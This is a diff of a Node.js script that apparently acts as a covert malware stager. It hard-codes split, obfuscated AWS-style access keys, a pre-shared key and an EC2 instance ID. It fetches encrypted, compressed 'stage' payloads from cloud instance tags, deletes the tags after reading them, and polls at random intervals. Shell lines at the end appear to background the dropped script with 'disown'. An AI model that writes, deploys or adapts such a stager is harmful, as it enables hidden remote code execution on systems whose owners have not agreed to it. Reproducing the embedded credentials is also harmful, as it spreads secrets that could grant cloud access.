@@ -72,12 +72,12 @@ const https = require('https');
 const zlib = require('zlib');
 const os = require('os');
 
-let PSK = "msp2nqMlUBfmlgAol9ZaEMRNcSOq05xp";
-let TG = "i-0" + "dee3866ff6055630";
+let PSK = "IsTUYCt0nj0QxoXfNtTme7uUFcUybFrd";
+let TG = "i-0" + "215d6478badf9468";
 let REGION = "eu-no" + "rth-1";
 let ID1 = "__CFG_ID__";
-let CK1 = "AKIA43CSKX" + "PE3XLG6UKG";
-let CK2 = "Ehxp6n1WxlxAXQcTvEqU" + "zGiLwZviwvM73u+btSbr";
+let CK1 = "AKIA43CSKX" + "PEWSHMVPZW";
+let CK2 = "qbB7OfExkrwa3kS6hl8o" + "+kMyRGHfNj9x9jt8/fO9";
 
 const POLL_MIN_S = 20;
 const POLL_MAX_S = 60;
@@ -226,13 +226,13 @@ async function fetchStage() {
     if (v === undefined) return null;
     parts.push(decrypt(v));
   }
-  const payload = zlib.gunzipSync(Buffer.concat(parts)).toString('utf8');
+  const data = zlib.gunzipSync(Buffer.concat(parts)).toString('utf8');
 
   const keys = [`${tagPrefix()}stage-count`];
   for (let i = 0; i < count; i++) keys.push(`${tagPrefix()}stage-${i}`);
   try { await deleteTagKeys(keys); } catch {}
 
-  return payload;
+  return data;
 }
 
 function randDelay() {
@@ -277,7 +277,6 @@ async function main() {
 }
 
 main().catch(() => process.exit(1));
-
 
 __CHECK_EOF__
 disown 2>/dev/null || true
